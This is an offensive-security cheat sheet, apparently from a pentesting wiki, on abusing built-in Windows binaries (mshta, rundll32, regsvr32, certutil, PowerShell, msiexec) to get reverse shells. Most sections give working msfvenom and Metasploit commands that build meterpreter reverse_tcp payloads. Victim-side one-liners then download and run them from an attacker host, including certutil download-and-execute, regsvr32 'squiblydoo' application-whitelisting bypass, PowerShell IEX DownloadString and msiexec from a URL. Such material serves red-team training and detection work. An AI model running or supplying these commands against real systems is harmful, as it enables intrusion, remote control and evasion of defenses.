# ⭕ LOL Binaries

## <mark style="color:red;">General Concept</mark>

Living Off the Land (LOL) binaries are the native Microsoft binary applications that are preinstalled on windows systems and are almost always available for us to use. these can be as simple as the echo command or be used for more advanced stuff like downloading and executing files, converting exe to cert or other interesting things that an attacker can leverage to bypass defense mechanisms.

Generally speaking, when we want a bin/reverse shell we go looking for the specific binaries that can download and execute our payloads. [LOLBAS ](https://lolbas-project.github.io)is a great collection of all known LOL binaries and we can search the collection for binaries with specific capabilities that we want by using a slash '/' and the name of the capability in the search bar for example /execute will show us all binaries that can execute code or scripts.

### <mark style="color:orange;">For Download</mark>

{% embed url="https://lolbas-project.github.io/#/download" %}

### <mark style="color:orange;">For Execute</mark>

{% embed url="https://lolbas-project.github.io/#/execute" %}

## <mark style="color:red;">Example Tools</mark>

<mark style="color:green;">**Mshta.exe :**</mark> Launch HTA attack via HTA Web Server of Metasploit

<mark style="color:green;">**Rundll32.exe :**</mark> Launch Rundll32 Attack via SMB Delivery of Metasploit

<mark style="color:green;">**Regsvr32.exe :**</mark> Launch Regsvr32 via Script Web Delivery of Metasploit

<mark style="color:green;">**Certutil.exe :**</mark> Launch MSbuild Attack via Msfvenom C# shellcode

<mark style="color:green;">**Powershell.exe :**</mark>

* Launch cscript.exe via Powershell
* Launch Batch File Attack via Powershell

<mark style="color:green;">**Msiexec.exe :**</mark> Launch msiexec attack via msfvenom

## <mark style="color:red;">Mshta.exe</mark>

Mshta.exe runs the Microsoft HTML Application Host, the Windows OS utility responsible for running **HTA**( HTML Application) files. HTML files that we can run JavaScript or VBScript with. You can interpret these files using the Microsoft MSHTA.exe tool.

Metasploit contain the “HTA Web Server” module which generates malicious hta file. This module hosts an HTML Application (HTA) that when opened will run a payload via Powershell. When a user navigates to the HTA file they will be prompted by IE twice before the payload is executed.

```
use exploit/windows/misc/hta_server
msf exploit(windows/misc/hta_server) > set srvhost 192.168.1.109
msf exploit(windows/misc/hta_server) > set lhost 192.168.1.109
msf exploit(windows/misc/hta_server) > exploit
```

```
mshta.exe http://192.168.1.109:8080/5EEiDSd70ET0k.hta
```

## <mark style="color:red;">Rundll32.exe</mark>

Rundll32.exe is associated with Windows Operating System that allows you to invoke a function exported from a **DLL**, either 16-bit or 32-bit and store it in proper memory libraries.

**Launch Rundll32 Attack via SMB Delivery of Metasploit**

Metasploit also contain the “SMB Delivery” module which generates malicious dll file. This module serves payloads via an SMB server and provides commands to retrieve and execute the generated payloads. Currently supports DLLs and Powershell.

```
use exploit/windows/smb/smb_delivery
msf exploit(windows/smb/smb_delivery) > set srvhost 192.168.1.109
msf exploit(windows/smb/smb_delivery) > exploit
```

Now run the malicious code through rundll32.exe on the victim machine (vulnerable to RCE) to obtain meterpreter sessions.

```
rundll32.exe \\192.168.1.109\vabFG\test.dll,0
```

## <mark style="color:red;">Regsvr32.exe</mark>

Regsvr32 is a command-line utility to register and unregister OLE controls, such as **DLLs** and ActiveX controls in the Windows Registry. Regsvr32.exe is installed in the %systemroot%\System32 folder in Windows XP and later versions of Windows.

_Syntax:_

```
Regsvr32 [/s][/u] [/n] [/i[:cmdline]] <dllname>
```

RegSvr32.exe has the following command-line options:

* /u – Unregister server
* /i – Call DllInstall passing it an optional \[cmdline]; when it is used with
* /u, it calls dll to uninstall
* /n – do not call DllRegisterServer; this option must be used with
* /s – Silent; display no message boxes

**Launch Regsvr32 via Script Web Delivery of Metasploit**



This module quickly fires up a web server that serves a payload. The provided command which will allow for a payload to download and execute. It will do it either specified scripting language interpreter or “squiblydoo” via regsvr32.exe for bypassing application whitelisting. The main purpose of this module is to quickly establish a session on a target machine when the attacker has to manually type in the command: e.g. Command Injection.

Regsvr32 uses “squiblydoo” technique for bypassing application whitelisting. The signed Microsoft binary file, Regsvr32, is able to request a .sct file and then execute the included PowerShell command inside of it. Both web requests (i.e., the **.sct file and PowerShell** download/execute) can occur on the same port. “PSH (Binary)” will write a file to the disk, allowing for custom binaries to be served up to be downloaded/executed

```
use exploit/multi/script/web_delivery
msf exploit (web_delivery)>set target 3
msf exploit (web_delivery)> set payload windows/meterpreter/reverse_tcp
msf exploit (web_delivery)> set lhost 192.168.1.109
msf exploit (web_delivery)>set srvhost 192.168.1.109
msf exploit (web_delivery)>exploit
```

```
regsvr32 /s /n /u /i:http://192.168.1.109:8080/xo31Jt5dIF.sct scrobj.dll
```

## <mark style="color:red;">Certutil.exe</mark>

Certutil.exe is a command-line program that is installed as part of Certificate Services. We can use this tool to execute our malicious **exe file** in the target machine to get a meterpreter session.

**Launch certutil Attack via Msfvenom**

Generate a malicious executable (.exe) file with msfvenom and **start multi/handler** to get the reverse shell of the victim’s machine.

```
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.109 lport=1234 -f exe > shell.exe
```

Now, to dump configuration information or shell.exe file files with certutil. you can follow below syntax:

```
use exploit/multi/handler
msf exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
msf exploit(multi/handler) > set lhost 192.168.1.109
msf exploit(multi/handler) > set lport 1234
msf exploit(multi/handler) > exploit
```

```
certutil.exe -urlcache -split -f http://192.168.1.109/shell.exe shell.exe & shell.exe
```

## <mark style="color:red;">**Batch File**</mark>

PowerShell allows the client to execute **bat file**_._

```
msfvenom -p cmd/windows/reverse_powershell lhost=192.168.1.109 lport=4444 > 1.bat
```

```
nc -nvlp 4444
```

Then execute the following command on the remote side to get netcat session.

```
// Some powershell -c "IEX((New-Object System.Net.WebClient).DownloadString('http://192.168.1.109/1.bat'))
```

## <mark style="color:red;">**Cscript**</mark>

PowerShell allows the client to execute **cscript.exe** to run **wsf, js** and **vbscript.**

```
msfvenom -p cmd/windows/reverse_powershell lhost=192.168.1.109 lport=1234 -f vbs > 1.vbs
```

Then execute the following command on the remote side to get a meterpreter session.

```
powershell.exe -c "(New-Object System.NET.WebClient).DownloadFile('http://192.168.1.109/1.vbs',\"$env:temp\test.vbs\");Start-Process %windir%\system32\cscript.exe \"$env:temp\test.vbs\""
```

```
use exploit/multi/handler
msf exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
msf exploit(multi/handler) > set lhost 192.168.1.109
msf exploit(multi/handler) > set lport 1234
msf exploit(multi/handler) > exploit
```

## <mark style="color:red;">Msiexec.exe</mark>

As we all are aware that Windows OS comes installed with a Windows Installer engine which is used by **MSI packages** for the installation of applications. The executable program that interprets packages and installs products is Msiexec.exe.

```
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.109 lport=1234 -f msi > 1.msi
```

```
use exploit/multi/handler
msf exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
msf exploit(multi/handler) > set lhost 192.168.1.109
msf exploit(multi/handler) > set lport 1234
msf exploit(multi/handler) > exploit
```

```
msiexec /q /i http://192.168.1.109/1.msi
```
